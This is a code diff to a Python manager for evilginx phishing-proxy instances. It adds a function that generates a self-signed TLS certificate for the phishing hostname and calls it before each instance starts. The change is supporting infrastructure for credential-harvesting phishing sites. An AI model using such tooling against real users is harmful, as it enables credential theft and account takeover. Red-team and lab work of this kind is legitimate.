@@ -188,6 +188,31 @@ def write_config(config_dir: Path, base_domain: str, phishlet_hostname: str, phi
     return path
 
 
+# ---------- self-signed cert provisioning (autocert off) ----------
+
+def _gen_self_signed_cert(config_dir: Path, phishlet_hostname: str) -> None:
+    """evilginx (autocert off) loads certs from <config_dir>/crt/sites/<host>/.
+    Generate a self-signed cert for the phishing hostname so the SNI listener
+    can terminate TLS (browsers will show a self-signed warning)."""
+    import subprocess
+    sites_dir = config_dir / "crt" / "sites" / phishlet_hostname
+    sites_dir.mkdir(parents=True, exist_ok=True)
+    cert = sites_dir / "fullchain.pem"
+    key = sites_dir / "privkey.pem"
+    if cert.exists() and key.exists():
+        return
+    subprocess.run(
+        [
+            "openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
+            "-keyout", str(key), "-out", str(cert), "-days", "365",
+            "-subj", f"/CN={phishlet_hostname}",
+            "-addext", f"subjectAltName=DNS:{phishlet_hostname},DNS:*.{phishlet_hostname}",
+        ],
+        check=True, capture_output=True,
+    )
+    logger.info("generated self-signed cert for %s", phishlet_hostname)
+
+
 # ---------- instance management ----------
 
 class InstanceManager:
@@ -305,6 +330,8 @@ class InstanceManager:
         # evilginx auto-prefixes the phishlet's landing hostname; use root domain only
         parts = base_domain.split(".")
         root_domain = ".".join(parts[-2:]) if len(parts) >= 3 else base_domain
+
+        _gen_self_signed_cert(config_dir, phishlet_hostname)
 
         proc = self._spawn(config_dir, phishlet_hostname, log_dir)
 
